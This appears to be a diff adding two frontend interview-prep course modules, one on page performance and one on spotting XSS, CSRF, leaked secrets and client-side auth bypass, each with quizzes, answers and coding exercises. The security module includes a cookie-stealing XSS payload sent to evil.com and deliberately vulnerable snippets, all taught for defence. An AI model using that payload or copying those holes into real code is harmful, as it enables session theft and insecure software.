+    content: `"How would you make this page 10× faster?" is a question senior frontend engineers face in both interviews and real production. The candidate who says "I'd optimize the images" sounds junior. The candidate who says "First I'd measure — I can't make it faster without knowing what's slow" passes the first filter. This module gives you a complete framework for frontend performance diagnosis and optimization.
+
+## Measure First, Optimize Second
+
+The single most common mistake in performance work is optimizing by instinct instead of data. Your answer to any performance question must start with measurement.
+
+**The measurement stack:**
+- **Lighthouse** in Chrome DevTools — LCP, CLS, FID/INP, TBT, Speed Index, plus specific opportunities
+- **Chrome DevTools Performance tab** — flame chart showing the exact JS functions consuming CPU
+- **Network tab** — waterfall showing request timing, blocking resources, and payload sizes
+- **Webpack Bundle Analyzer** (\`npx next build && npx @next/bundle-analyzer\`) — which packages are largest in the bundle
+- **Web Vitals extension** — real-time Core Web Vitals on any page
+
+**The three Core Web Vitals you must know:**
+- **LCP (Largest Contentful Paint)** — time for the main content to render. Target: < 2.5s. Most commonly caused by unoptimized images or render-blocking scripts.
+- **CLS (Cumulative Layout Shift)** — amount of unexpected layout movement. Target: < 0.1. Most commonly caused by images without dimensions or fonts loading late.
+- **INP (Interaction to Next Paint)** — responsiveness to user input. Target: < 200ms. Most commonly caused by long JavaScript tasks blocking the main thread.
+
+## The Frontend Performance Hierarchy
+
+Optimizations, in order of highest to lowest impact:
+
+**1. Eliminate what you don't need** (10–50× impact)
+Unused JavaScript is the biggest performance killer. Remove unused dependencies, split code by route, and defer non-critical scripts.
+\`\`\`js
+// Next.js automatic route-based code splitting
+// Each page is its own JS chunk — only loads what's needed
+import dynamic from 'next/dynamic'
+const HeavyChart = dynamic(() => import('./HeavyChart'), { ssr: false, loading: () => <Skeleton /> })
+\`\`\`
+
+**2. Optimize images** (3–10× impact on image-heavy pages)
+\`\`\`jsx
+// next/image automatically: WebP conversion, responsive sizes, lazy loading, prevents CLS with aspect ratio
+<Image src="/hero.jpg" alt="Hero" width={1200} height={600} priority /> // priority for above-fold LCP image
+\`\`\`
+
+**3. Load fonts correctly** (eliminates CLS + LCP delay)
+\`\`\`js
+// next/font loads fonts at build time, self-hosted, zero CLS
+import { Inter } from 'next/font/google'
+const inter = Inter({ subsets: ['latin'], display: 'swap' })
+\`\`\`
+
+**4. Reduce JavaScript execution** (2–5× on JS-heavy pages)
+- Move data fetching to Server Components (zero client bundle impact)
+- Use \`useMemo\` and \`useCallback\` only where profiling shows re-computation cost
+- Avoid blocking the main thread with long synchronous operations
+
+**5. Cache aggressively** (eliminates redundant work)
+- React Query caches server data — staleTime and gcTime prevent unnecessary refetches
+- Next.js caches fetch() responses — revalidate controls freshness
+
+## Answering "How Would You Make This 10× Faster?"
+
+**Framework**: Measure → Identify bottleneck type → Apply targeted fix → Verify improvement
+
+1. Run Lighthouse and record baseline LCP, CLS, INP
+2. Look at the Network tab — what's the largest resource? What's render-blocking?
+3. Check the bundle analyzer — is there a 500KB library that could be replaced?
+4. Apply the highest-impact fix first (usually images or unused JS)
+5. Re-run Lighthouse — did the metric improve?
+
+**Never say**: "I would optimize everything." Say: "I would measure first, identify the specific bottleneck, apply the most targeted fix, and verify the improvement with Lighthouse before moving to the next item."`,
+    keyTerms: [
+      { term: 'LCP (Largest Contentful Paint)', definition: 'Core Web Vital measuring how long the main content takes to render. Target: < 2.5s. Primary causes: unoptimized hero images, render-blocking scripts.' },
+      { term: 'CLS (Cumulative Layout Shift)', definition: 'Core Web Vital measuring unexpected layout movement during load. Target: < 0.1. Primary causes: images without dimensions, fonts loading after text.' },
+      { term: 'INP (Interaction to Next Paint)', definition: 'Core Web Vital measuring responsiveness to user input. Target: < 200ms. Primary cause: long JavaScript tasks blocking the main thread.' },
+      { term: 'Code Splitting', definition: 'Breaking a JavaScript bundle into smaller chunks that load only when needed — Next.js does route-level splitting automatically; dynamic() enables component-level splitting.' },
+      { term: 'Bundle Analyzer', definition: 'A tool visualizing the size contribution of each package in your JavaScript bundle — identifies large dependencies to replace, lazy-load, or remove.' },
+    ],
+    quiz: [
+      { q: 'An interviewer asks "How would you make this page 10× faster?" The strongest first response is:', options: ['"I would optimize the images."', '"I would measure first — run Lighthouse to identify the specific bottleneck before touching any code."', '"I would remove all JavaScript."', '"I would switch to a static site generator."'], correct: 1, explanation: 'Measuring before optimizing is the hallmark of a senior engineer. Saying "measure first" immediately differentiates you — most candidates jump to guessing the solution without data.' },
+      { q: 'Your LCP is 8 seconds. The Network tab shows a 2.4MB hero image loading without any compression. The highest-impact fix is:', options: ['Add more server RAM', 'Replace the raw <img> with next/image and add priority attribute for the above-fold image', 'Enable HTTP/2', 'Add a loading spinner so the wait feels shorter'], correct: 1, explanation: 'next/image converts to WebP (typically 70–80% size reduction), adds responsive sizes, prevents CLS, and the priority attribute preloads the above-fold image — directly fixing the LCP bottleneck.' },
+      { q: 'What causes Cumulative Layout Shift (CLS) and how do you fix it?', options: ['Slow API responses — add loading skeletons', 'Images without explicit dimensions, fonts loading late — fix with width/height on images and next/font', 'Too many React components — use virtualization', 'Server-side rendering instead of client rendering'], correct: 1, explanation: 'CLS happens when the browser doesn\'t know an element\'s size before it loads, causing content to shift. Explicit width/height on images and next/font (which reserves space before loading) are the standard fixes.' },
+      { q: 'Moving a data-fetching component from a Client Component to a Server Component improves performance because:', options: ['Server Components are faster at rendering HTML', 'The data fetching code is excluded from the client JavaScript bundle entirely', 'Server Components automatically cache all responses', 'Server Components use a faster version of fetch()'], correct: 1, explanation: 'Server Components have zero client bundle impact — they render on the server and send HTML. The data fetching logic never ships to the browser, reducing bundle size and eliminating client-side waterfall requests.' },
+    ],
+    ide: {
+      language: 'javascript',
+      task: 'Write a function `performanceAudit(pageUrl, lcp, cls, inp, largestResource, unusedJs)` that formats a Lighthouse-style performance audit report with specific recommendations. Then fill it in for a realistic slow page scenario (LCP: 7.2s, CLS: 0.35, INP: 450ms).',
+      starterCode: `function performanceAudit({ pageUrl, lcp, cls, inp, largestResource, unusedJs }) {
+  // Format the audit as a report with:
+  // 1. Current metrics vs targets
+  // 2. Priority issues (sorted by impact)
+  // 3. Specific fixes for each issue
+}
+
+const audit = performanceAudit({
+  pageUrl: '/jobs',
+  lcp: 7.2,            // seconds (target < 2.5s)
+  cls: 0.35,           // score (target < 0.1)
+  inp: 450,            // ms (target < 200ms)
+  largestResource: '2.4MB uncompressed hero image (JPEG)',
+  unusedJs: '380KB unused JavaScript in main bundle'
+})
+
+console.log(audit)`,
+      solution: `function performanceAudit({ pageUrl, lcp, cls, inp, largestResource, unusedJs }) {
+  const issues = []
+
+  if (lcp > 2.5) issues.push({ severity: 'CRITICAL', metric: 'LCP', current: lcp + 's', target: '<2.5s', fix: 'Replace hero image with next/image + priority attribute. WebP conversion will reduce from 2.4MB to ~400KB.' })
+  if (cls > 0.1) issues.push({ severity: 'HIGH', metric: 'CLS', current: cls, target: '<0.1', fix: 'Add explicit width/height to all images. Migrate Google Fonts to next/font to eliminate FOUT.' })
+  if (inp > 200) issues.push({ severity: 'HIGH', metric: 'INP', current: inp + 'ms', target: '<200ms', fix: 'Profile with Chrome DevTools Performance tab to find long tasks. Likely caused by 380KB unused JS — defer with dynamic() imports.' })
+  if (unusedJs) issues.push({ severity: 'HIGH', metric: 'Bundle size', current: unusedJs, target: '<100KB unused', fix: 'Run @next/bundle-analyzer. Move heavy dependencies to dynamic() or replace with lighter alternatives.' })
+
+  return \`PERFORMANCE AUDIT: \${pageUrl}
+
+METRICS:
+  LCP: \${lcp}s \${lcp > 2.5 ? '❌ FAIL' : '✅ PASS'} (target < 2.5s)
+  CLS: \${cls} \${cls > 0.1 ? '❌ FAIL' : '✅ PASS'} (target < 0.1)
+  INP: \${inp}ms \${inp > 200 ? '❌ FAIL' : '✅ PASS'} (target < 200ms)
+
+PRIORITY ISSUES:
+\${issues.map((i, n) => \`  \${n + 1}. [\${i.severity}] \${i.metric}: \${i.current} → Fix: \${i.fix}\`).join('\\n')}
+
+NEXT STEP: Apply fix #1 first, re-run Lighthouse to verify improvement before moving to #2.\`
+}
+
+const audit = performanceAudit({
+  pageUrl: '/jobs',
+  lcp: 7.2,
+  cls: 0.35,
+  inp: 450,
+  largestResource: '2.4MB uncompressed hero image (JPEG)',
+  unusedJs: '380KB unused JavaScript in main bundle'
+})
+
+console.log(audit)`,
+      hints: ['Sort issues by impact — LCP is usually the most critical for perceived performance', 'Each fix should be specific: "use next/image with priority", not just "optimize images"', 'The final step should always be "re-run Lighthouse to verify" — performance is iterative'],
+    },
+  },
+  {
+    id: 'cc-interview-fe-m14', track: 'crash', title: 'Security Instincts — Spot the Vulnerability',
+    subtitle: 'Senior engineers catch XSS, CSRF, auth bypasses, and data leaks in code review — without being told to look. Build the instincts that make you a standout candidate.',
+    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
+    level: 'PhD', xp: 260, duration: 16, module: 14, certArea: 'Frontend Interview Prep',
+    content: `Security instincts are what separate a senior engineer from a mid-level one. Junior engineers write the feature. Mid-level engineers write tests. Senior engineers look at any piece of code and immediately ask "how could this be exploited?" This module builds those instincts.
+
+## The Frontend Security Mental Model
+
+Every frontend security vulnerability falls into one of three categories: **injecting code** (XSS), **forging identity/requests** (CSRF, auth bypass), or **leaking data** (exposed secrets, over-permissive APIs).
+
+Train yourself to ask these three questions when reading any frontend code:
+1. Can user-controlled input reach the DOM without sanitization? (XSS)
+2. Can a malicious site trigger this action on behalf of an authenticated user? (CSRF)
+3. Does this code expose secrets, tokens, or unauthorized data? (Data leak)
+
+## XSS (Cross-Site Scripting) — The Most Common Frontend Vulnerability
+
+XSS occurs when user-provided content is rendered as HTML or JavaScript. The classic sign:
+
+\`\`\`jsx
+// VULNERABLE — dangerouslySetInnerHTML with unsanitized user content
+function Comment({ text }) {
+  return <div dangerouslySetInnerHTML={{ __html: text }} />
+}
+// If text = '<script>fetch("https://evil.com/?cookie="+document.cookie)</script>'
+// The script executes in the victim's browser, stealing their session cookie
+\`\`\`
+
+**The fix**: Never use dangerouslySetInnerHTML with user content. If rich text is required, sanitize with DOMPurify:
+\`\`\`jsx
+import DOMPurify from 'dompurify'
+function Comment({ text }) {
+  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(text) }} />
+}
+\`\`\`
+
+React's JSX is safe by default — \`{userContent}\` auto-escapes HTML. The vulnerability only appears with dangerouslySetInnerHTML, eval(), or direct DOM manipulation.
+
+## CSRF (Cross-Site Request Forgery) — Forged Requests
+
+CSRF occurs when a malicious site can trigger authenticated requests to your API using a victim's session. The classic attack: a hidden form on evil.com that POSTs to your-bank.com/transfer.
+
+**Frontend defenses**:
+- Use \`SameSite=Strict\` or \`SameSite=Lax\` on session cookies — prevents cross-origin cookies from being sent
+- Never accept authentication solely via cookies from third-party origins without CSRF tokens
+- In Supabase: the JWT stored in httpOnly + SameSite cookies is protected from CSRF by default
+
+## Exposed Secrets and Data Leaks
+
+\`\`\`js
+// VULNERABLE — API key in client bundle
+const response = await fetch('/api/data', {
+  headers: { 'x-api-key': 'sk_live_actualSecretKey123' }
+})
+// Any user who opens DevTools Network tab sees this key
+\`\`\`
+
+**Rules**:
+- \`NEXT_PUBLIC_\` prefix → goes into the client bundle (public)
+- Without prefix → server-only (safe for secrets)
+- Never put \`SUPABASE_SERVICE_ROLE_KEY\`, payment keys, or internal API keys in client-side code
+
+## Auth Bypass Patterns to Spot
+
+\`\`\`jsx
+// VULNERABLE — client-side auth check with no server enforcement
+function AdminPage() {
+  const isAdmin = localStorage.getItem('isAdmin') === 'true'
+  if (!isAdmin) return <p>Not authorized</p>
+  return <AdminDashboard />  // Still loads the component and its data
+}
+// An attacker sets localStorage.setItem('isAdmin', 'true') and sees AdminDashboard
+\`\`\`
+
+**The fix**: Protect pages in Next.js middleware and verify authorization in every Server Component/API route — never trust client-side auth state alone.
+
+## The Code Review Security Checklist
+
+When reviewing any PR, scan for:
+1. **dangerouslySetInnerHTML** — is the content sanitized?
+2. **Environment variables** — is NEXT_PUBLIC_ used for anything sensitive?
+3. **URL parameters rendered directly** — \`const name = searchParams.get('name'); return <h1>{name}</h1>\` is safe (JSX escapes), but \`dangerouslySetInnerHTML={{ __html: name }}\` is not
+4. **Auth checks client-side only** — is there a corresponding server-side check?
+5. **Third-party scripts** — does a new \`<script src="https://...">\` in _document.tsx belong there?`,
+    keyTerms: [
+      { term: 'XSS (Cross-Site Scripting)', definition: 'A vulnerability where user-controlled content is rendered as executable HTML or JavaScript — stealing sessions, redirecting users, or modifying page content.' },
+      { term: 'CSRF (Cross-Site Request Forgery)', definition: 'An attack where a malicious site triggers authenticated requests to another site using the victim\'s cookies — prevented by SameSite cookie attribute.' },
+      { term: 'dangerouslySetInnerHTML', definition: 'React\'s escape hatch for raw HTML injection — safe only with a sanitization library like DOMPurify. Using it with unsanitized user input is a direct XSS vulnerability.' },
+      { term: 'NEXT_PUBLIC_ prefix', definition: 'Environment variable prefix in Next.js that includes the value in the client JavaScript bundle — never use it for secrets, API keys, or service role tokens.' },
+      { term: 'Client-Side Auth Bypass', definition: 'A vulnerability where authorization is enforced only in the browser (e.g., hiding a component) but not on the server — attackers bypass the UI check and access protected data.' },
+    ],
+    quiz: [
+      { q: 'A code review shows: `<div dangerouslySetInnerHTML={{ __html: comment.body }} />`. What is the vulnerability and fix?', options: ['This is safe — React escapes HTML automatically', 'XSS vulnerability — user content rendered as HTML can execute scripts. Fix: wrap comment.body with DOMPurify.sanitize()', 'This causes a re-render loop', 'This is a CSRF vulnerability'], correct: 1, explanation: 'dangerouslySetInnerHTML bypasses React\'s automatic escaping. If comment.body contains a <script> tag, it executes. DOMPurify.sanitize() removes dangerous HTML while preserving safe formatting.' },
+      { q: 'A developer adds `NEXT_PUBLIC_PAYMENT_SECRET_KEY=sk_live_...` to .env.local. What is the security impact?', options: ['No impact — .env.local is gitignored', 'The key is bundled into the client JavaScript and visible in DevTools to any user', 'NEXT_PUBLIC_ variables are automatically encrypted at runtime', 'This only affects development, not production'], correct: 1, explanation: 'NEXT_PUBLIC_ variables are inlined into the browser bundle at build time. Anyone who opens DevTools → Sources or Network can read them. Secret keys must never have the NEXT_PUBLIC_ prefix.' },
+      { q: 'An AdminPage component checks `localStorage.getItem("isAdmin") === "true"` before rendering. What is wrong?', options: ['localStorage is slow for auth checks', 'Client-side auth checks are bypassable — an attacker sets the localStorage value and accesses the component. Server-side authorization is required.', 'This approach only works in Chrome', 'The condition is inverted'], correct: 1, explanation: 'Client-side code is fully controllable by the attacker — they can set any localStorage value in the browser console. Authorization must be enforced in Next.js middleware, Server Components, and API routes.' },
+      { q: 'Which React pattern is safe from XSS by default?', options: ['dangerouslySetInnerHTML={{ __html: userInput }}', 'eval(userInput)', '{userInput} in JSX', 'document.innerHTML = userInput'], correct: 2, explanation: 'JSX text interpolation ({userInput}) automatically HTML-escapes the content before inserting it into the DOM. dangerouslySetInnerHTML, eval(), and direct DOM manipulation all bypass this protection.' },
+    ],
+    ide: {
+      language: 'javascript',
+      task: 'Write a function `securityReview(code)` that scans a code snippet for 4 common frontend security issues: dangerouslySetInnerHTML without sanitization, NEXT_PUBLIC_ used for secrets, client-side-only auth checks, and eval(). Return an array of findings with vulnerability type and description. Test it on the vulnerable snippets below.',
+      starterCode: `function securityReview(code) {
+  const findings = []
+
+  // Check for each vulnerability pattern:
+  // 1. dangerouslySetInnerHTML (warn unless DOMPurify.sanitize is in the same expression)
+  // 2. NEXT_PUBLIC_ with words like SECRET, KEY, TOKEN, PASS
+  // 3. localStorage.getItem used for auth/admin checks
+  // 4. eval() usage
+
+  return findings
+}
+
+// Test on these snippets:
+const snippet1 = \`<div dangerouslySetInnerHTML={{ __html: userInput }} />\`
+const snippet2 = \`const key = process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY\`
+const snippet3 = \`if (localStorage.getItem('isAdmin') === 'true') showAdminPanel()\`
+const snippet4 = \`eval(userSubmittedCode)\`
+
+console.log('Snippet 1:', securityReview(snippet1))
+console.log('Snippet 2:', securityReview(snippet2))
+console.log('Snippet 3:', securityReview(snippet3))
+console.log('Snippet 4:', securityReview(snippet4))`,
+      solution: `function securityReview(code) {
+  const findings = []
+
+  if (code.includes('dangerouslySetInnerHTML') && !code.includes('DOMPurify.sanitize')) {
+    findings.push({ type: 'XSS', severity: 'CRITICAL', description: 'dangerouslySetInnerHTML without DOMPurify.sanitize() — user content rendered as HTML can execute arbitrary scripts.' })
+  }
+
+  if (/NEXT_PUBLIC_[A-Z_]*(SECRET|KEY|TOKEN|PASS|PRIVATE)/i.test(code)) {
+    findings.push({ type: 'Secret Exposure', severity: 'CRITICAL', description: 'NEXT_PUBLIC_ prefix exposes this value in the client JavaScript bundle — visible to all users in DevTools. Remove NEXT_PUBLIC_ prefix and access only in Server Components or API routes.' })
+  }
+
+  if (/localStorage\\.getItem[^)]*['"](isAdmin|admin|role|auth)['"]/i.test(code)) {
+    findings.push({ type: 'Auth Bypass', severity: 'HIGH', description: 'Authorization based on localStorage is bypassable — any attacker can set this value in the browser console. Enforce authorization server-side in middleware or API routes.' })
+  }
+
+  if (/\\beval\\s*\\(/.test(code)) {
+    findings.push({ type: 'Code Injection', severity: 'CRITICAL', description: 'eval() executes arbitrary JavaScript strings — direct code injection vulnerability. Never use eval() with any external or user-controlled input.' })
+  }
+
+  return findings.length ? findings : [{ type: 'Clean', severity: 'NONE', description: 'No common vulnerabilities detected in this snippet.' }]
+}
+
+const snippet1 = \`<div dangerouslySetInnerHTML={{ __html: userInput }} />\`
+const snippet2 = \`const key = process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY\`
+const snippet3 = \`if (localStorage.getItem('isAdmin') === 'true') showAdminPanel()\`
+const snippet4 = \`eval(userSubmittedCode)\`
+
+console.log('Snippet 1:', securityReview(snippet1))
+console.log('Snippet 2:', securityReview(snippet2))
+console.log('Snippet 3:', securityReview(snippet3))
+console.log('Snippet 4:', securityReview(snippet4))`,
+      hints: ['Use regex to detect patterns — /NEXT_PUBLIC_.*SECRET/i catches variations', 'dangerouslySetInnerHTML is only safe when DOMPurify.sanitize wraps the value — check for both', 'localStorage auth checks are a red flag even if the logic looks correct — server enforcement is what matters'],
+    },
+  },
 ]
